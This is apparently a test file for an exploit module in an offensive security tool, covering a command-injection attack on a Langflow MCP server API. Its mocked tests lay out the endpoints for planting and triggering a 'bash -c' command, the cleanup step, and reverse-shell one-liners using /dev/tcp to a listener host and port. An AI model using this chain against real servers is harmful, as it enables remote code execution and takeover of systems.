"""Tests for flowhound.vulnerabilities.exploits.cve_2026_93674."""

from unittest.mock import MagicMock, patch

from hypothesis import given, settings
from hypothesis import strategies as st

from flowhound.vulnerabilities.exploits.cve_2026_93674 import Exploit

_BASE_URL = "http://localhost:7860"
_AUTH_HEADERS = {
    "Authorization": "Bearer test-token",
    "Content-Type": "application/json",
}


def _mock_resp(status: int = 200, json_data=None):
    resp = MagicMock()
    resp.status_code = status
    if json_data is not None:
        resp.json.return_value = json_data
    return resp


def _mock_auto_login_ok():
    resp = MagicMock()
    resp.status_code = 200
    resp.json.return_value = {"access_token": "test-token"}
    return resp


def _mock_auto_login_disabled():
    resp = MagicMock()
    resp.status_code = 403
    resp.json.return_value = {}
    return resp


def _mock_auth_post(status: int = 200):
    resp = MagicMock()
    resp.status_code = status
    resp.json.return_value = {"access_token": "test-token"}
    return resp


# ---------------------------------------------------------------------------
# _wrap_command (static)
# ---------------------------------------------------------------------------


class TestWrapCommand:
    def test_returns_bash_as_command(self):
        command, _ = Exploit._wrap_command("id")
        assert command == "bash"

    def test_returns_list_with_dash_c(self):
        _, args = Exploit._wrap_command("id")
        assert args[0] == "-c"

    def test_one_liner_contains_cmd(self):
        _, args = Exploit._wrap_command("whoami")
        assert "whoami" in args[1]

    def test_one_liner_redirects_to_dev_null(self):
        _, args = Exploit._wrap_command("id")
        assert ">/dev/null 2>&1" in args[1]

    def test_one_liner_contains_jsonrpc_notification(self):
        _, args = Exploit._wrap_command("id")
        assert "notifications/tools/list_changed" in args[1]

    def test_cmd_wrapped_in_subshell(self):
        _, args = Exploit._wrap_command("echo hello > /tmp/test.txt")
        # subshell ensures user redirects are not overridden by >/dev/null
        assert args[1].startswith("(")

    def test_printf_emits_jsonrpc(self):
        _, args = Exploit._wrap_command("id")
        assert "printf" in args[1]
        assert '"jsonrpc"' in args[1]
        assert '"2.0"' in args[1]


# ---------------------------------------------------------------------------
# _wrap_command — hypothesis
# ---------------------------------------------------------------------------


@given(st.text(alphabet=st.characters(blacklist_categories=("Cs",)), min_size=1))
@settings(max_examples=200)
def test_wrap_command_always_returns_bash(cmd):
    command, _ = Exploit._wrap_command(cmd)
    assert command == "bash"


@given(st.text(alphabet=st.characters(blacklist_categories=("Cs",)), min_size=1))
@settings(max_examples=200)
def test_wrap_command_args_always_two_elements(cmd):
    _, args = Exploit._wrap_command(cmd)
    assert len(args) == 2
    assert args[0] == "-c"


@given(st.text(alphabet=st.characters(blacklist_categories=("Cs",)), min_size=1))
@settings(max_examples=200)
def test_wrap_command_one_liner_always_contains_cmd(cmd):
    _, args = Exploit._wrap_command(cmd)
    assert cmd in args[1]


# ---------------------------------------------------------------------------
# save_command
# ---------------------------------------------------------------------------


class TestSaveCommand:
    def test_posts_to_correct_endpoint(self):
        mock_resp = _mock_resp(200)
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.cve_2026_93674.post",
            return_value=mock_resp,
        ) as mock_post:
            exploit.save_command(
                base_url=_BASE_URL,
                auth=_AUTH_HEADERS,
                server_name="deadbeef",
                command="bash",
                args=["-c", "id"],
            )
        url = mock_post.call_args.args[0]
        assert url == _BASE_URL + "/api/v2/mcp/servers/deadbeef"

    def test_sends_command_and_args_in_body(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.cve_2026_93674.post",
            return_value=_mock_resp(200),
        ) as mock_post:
            exploit.save_command(
                base_url=_BASE_URL,
                auth=_AUTH_HEADERS,
                server_name="deadbeef",
                command="bash",
                args=["-c", "id"],
            )
        body = mock_post.call_args.kwargs["json"]
        assert body["command"] == "bash"
        assert body["args"] == ["-c", "id"]

    def test_returns_response_on_success(self):
        mock_resp = _mock_resp(200)
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.cve_2026_93674.post",
            return_value=mock_resp,
        ):
            result = exploit.save_command(
                base_url=_BASE_URL,
                auth=_AUTH_HEADERS,
                server_name="deadbeef",
                command="bash",
                args=["-c", "id"],
            )
        assert result is mock_resp

    def test_network_error_returns_none(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.cve_2026_93674.post",
            side_effect=ConnectionError("refused"),
        ):
            result = exploit.save_command(
                base_url=_BASE_URL,
                auth=_AUTH_HEADERS,
                server_name="deadbeef",
                command="bash",
                args=["-c", "id"],
            )
        assert result is None

    def test_forwards_proxies(self):
        proxies = {"http": "http://127.0.0.1:8080"}
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.cve_2026_93674.post",
            return_value=_mock_resp(200),
        ) as mock_post:
            exploit.save_command(
                base_url=_BASE_URL,
                auth=_AUTH_HEADERS,
                server_name="deadbeef",
                command="bash",
                args=["-c", "id"],
                proxies=proxies,
            )
        assert mock_post.call_args.kwargs["proxies"] == proxies


# ---------------------------------------------------------------------------
# trigger_vuln
# ---------------------------------------------------------------------------


class TestTriggerVuln:
    def test_gets_correct_endpoint(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.cve_2026_93674.get",
            return_value=_mock_resp(200, []),
        ) as mock_get:
            exploit.trigger_vuln(base_url=_BASE_URL, auth=_AUTH_HEADERS)
        assert (
            mock_get.call_args.args[0]
            == _BASE_URL + "/api/v2/mcp/servers?action_count=true"
        )

    def test_returns_response(self):
        mock_resp = _mock_resp(200, [])
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.cve_2026_93674.get",
            return_value=mock_resp,
        ):
            assert (
                exploit.trigger_vuln(base_url=_BASE_URL, auth=_AUTH_HEADERS)
                is mock_resp
            )

    def test_network_error_returns_none(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.cve_2026_93674.get",
            side_effect=ConnectionError("refused"),
        ):
            assert exploit.trigger_vuln(base_url=_BASE_URL, auth=_AUTH_HEADERS) is None


# ---------------------------------------------------------------------------
# _delete_server
# ---------------------------------------------------------------------------


class TestDeleteServer:
    def test_sends_delete_to_correct_endpoint(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.cve_2026_93674.delete",
        ) as mock_delete:
            exploit._delete_server(
                base_url=_BASE_URL, auth=_AUTH_HEADERS, server_name="deadbeef"
            )
        assert (
            mock_delete.call_args.args[0] == _BASE_URL + "/api/v2/mcp/servers/deadbeef"
        )

    def test_network_error_does_not_raise(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.cve_2026_93674.delete",
            side_effect=ConnectionError("refused"),
        ):
            exploit._delete_server(
                base_url=_BASE_URL, auth=_AUTH_HEADERS, server_name="deadbeef"
            )  # must not raise


# ---------------------------------------------------------------------------
# exploit — controller
# ---------------------------------------------------------------------------


class TestExploit:
    def test_auth_failure_returns_false(self):
        exploit = Exploit()
        with (
            patch(
                "flowhound.vulnerabilities.clients.langflow.get",
                return_value=_mock_auto_login_disabled(),
            ),
            patch(
                "flowhound.vulnerabilities.clients.langflow.post",
                return_value=_mock_auth_post(401),
            ),
        ):
            assert (
                exploit.exploit(base_url=_BASE_URL, username="u", password="p") is False
            )

    def test_save_failure_returns_false(self):
        exploit = Exploit()
        with (
            patch(
                "flowhound.vulnerabilities.clients.langflow.get",
                return_value=_mock_auto_login_ok(),
            ),
            patch.object(exploit, "save_command", return_value=_mock_resp(500)),
        ):
            assert (
                exploit.exploit(base_url=_BASE_URL, username="u", password="p") is False
            )

    def test_save_network_error_returns_false(self):
        exploit = Exploit()
        with (
            patch(
                "flowhound.vulnerabilities.clients.langflow.get",
                return_value=_mock_auto_login_ok(),
            ),
            patch.object(exploit, "save_command", return_value=None),
        ):
            assert (
                exploit.exploit(base_url=_BASE_URL, username="u", password="p") is False
            )

    def test_trigger_network_error_returns_false(self):
        exploit = Exploit()
        with (
            patch(
                "flowhound.vulnerabilities.clients.langflow.get",
                return_value=_mock_auto_login_ok(),
            ),
            patch.object(exploit, "save_command", return_value=_mock_resp(200)),
            patch.object(exploit, "trigger_vuln", return_value=None),
            patch.object(exploit, "_delete_server"),
        ):
            assert (
                exploit.exploit(base_url=_BASE_URL, username="u", password="p") is False
            )

    def test_trigger_non_200_returns_false(self):
        exploit = Exploit()
        with (
            patch(
                "flowhound.vulnerabilities.clients.langflow.get",
                return_value=_mock_auto_login_ok(),
            ),
            patch.object(exploit, "save_command", return_value=_mock_resp(200)),
            patch.object(exploit, "trigger_vuln", return_value=_mock_resp(500)),
            patch.object(exploit, "_delete_server"),
        ):
            assert (
                exploit.exploit(base_url=_BASE_URL, username="u", password="p") is False
            )

    def test_success_returns_true(self):
        exploit = Exploit()
        with (
            patch(
                "flowhound.vulnerabilities.clients.langflow.get",
                return_value=_mock_auto_login_ok(),
            ),
            patch.object(exploit, "save_command", return_value=_mock_resp(200)),
            patch.object(exploit, "trigger_vuln", return_value=_mock_resp(200, [])),
            patch.object(exploit, "_delete_server"),
        ):
            assert (
                exploit.exploit(base_url=_BASE_URL, username="u", password="p") is True
            )

    def test_success_calls_delete_server(self):
        exploit = Exploit()
        with (
            patch(
                "flowhound.vulnerabilities.clients.langflow.get",
                return_value=_mock_auto_login_ok(),
            ),
            patch.object(exploit, "save_command", return_value=_mock_resp(200)),
            patch.object(exploit, "trigger_vuln", return_value=_mock_resp(200, [])),
            patch.object(exploit, "_delete_server") as mock_delete,
        ):
            exploit.exploit(base_url=_BASE_URL, username="u", password="p")
        mock_delete.assert_called_once()

    def test_uses_default_cmd_when_no_payload(self):
        exploit = Exploit()
        with (
            patch(
                "flowhound.vulnerabilities.clients.langflow.get",
                return_value=_mock_auto_login_ok(),
            ),
            patch.object(
                exploit, "save_command", return_value=_mock_resp(200)
            ) as mock_save,
            patch.object(exploit, "trigger_vuln", return_value=_mock_resp(200, [])),
            patch.object(exploit, "_delete_server"),
        ):
            exploit.exploit(base_url=_BASE_URL, username="u", password="p")
        one_liner = mock_save.call_args.kwargs["args"][1]
        assert Exploit._DEFAULT_CMD in one_liner

    def test_uses_raw_command_from_payload(self):
        payload = MagicMock()
        payload.raw_command = "whoami"
        payload.blocking = False
        exploit = Exploit()
        with (
            patch(
                "flowhound.vulnerabilities.clients.langflow.get",
                return_value=_mock_auto_login_ok(),
            ),
            patch.object(
                exploit, "save_command", return_value=_mock_resp(200)
            ) as mock_save,
            patch.object(exploit, "trigger_vuln", return_value=_mock_resp(200, [])),
            patch.object(exploit, "_delete_server"),
        ):
            exploit.exploit(
                base_url=_BASE_URL, username="u", password="p", payload=payload
            )
        one_liner = mock_save.call_args.kwargs["args"][1]
        assert "whoami" in one_liner

    def test_reverse_shell_payload_builds_dev_tcp_one_liner(self):
        payload = MagicMock()
        payload.raw_command = None
        payload.blocking = True
        payload.lhost = "192.168.1.5"
        payload.lport = 4444
        exploit = Exploit()
        with (
            patch(
                "flowhound.vulnerabilities.clients.langflow.get",
                return_value=_mock_auto_login_ok(),
            ),
            patch.object(
                exploit, "save_command", return_value=_mock_resp(200)
            ) as mock_save,
            patch.object(exploit, "trigger_vuln", return_value=_mock_resp(200, [])),
            patch.object(exploit, "_delete_server"),
        ):
            exploit.exploit(
                base_url=_BASE_URL, username="u", password="p", payload=payload
            )
        one_liner = mock_save.call_args.kwargs["args"][1]
        assert "192.168.1.5" in one_liner
        assert "4444" in one_liner
        assert "/dev/tcp/" in one_liner

    def test_reverse_shell_one_liner_is_backgrounded(self):
        payload = MagicMock()
        payload.raw_command = None
        payload.blocking = True
        payload.lhost = "10.0.0.1"
        payload.lport = 9001
        exploit = Exploit()
        with (
            patch(
                "flowhound.vulnerabilities.clients.langflow.get",
                return_value=_mock_auto_login_ok(),
            ),
            patch.object(
                exploit, "save_command", return_value=_mock_resp(200)
            ) as mock_save,
            patch.object(exploit, "trigger_vuln", return_value=_mock_resp(200, [])),
            patch.object(exploit, "_delete_server"),
        ):
            exploit.exploit(
                base_url=_BASE_URL, username="u", password="p", payload=payload
            )
        one_liner = mock_save.call_args.kwargs["args"][1]
        # trailing & ensures the shell is backgrounded so printf fires immediately
        assert "0>&1 &" in one_liner

    def test_save_command_receives_bash_as_command(self):
        exploit = Exploit()
        with (
            patch(
                "flowhound.vulnerabilities.clients.langflow.get",
                return_value=_mock_auto_login_ok(),
            ),
            patch.object(
                exploit, "save_command", return_value=_mock_resp(200)
            ) as mock_save,
            patch.object(exploit, "trigger_vuln", return_value=_mock_resp(200, [])),
            patch.object(exploit, "_delete_server"),
        ):
            exploit.exploit(base_url=_BASE_URL, username="u", password="p")
        assert mock_save.call_args.kwargs["command"] == "bash"
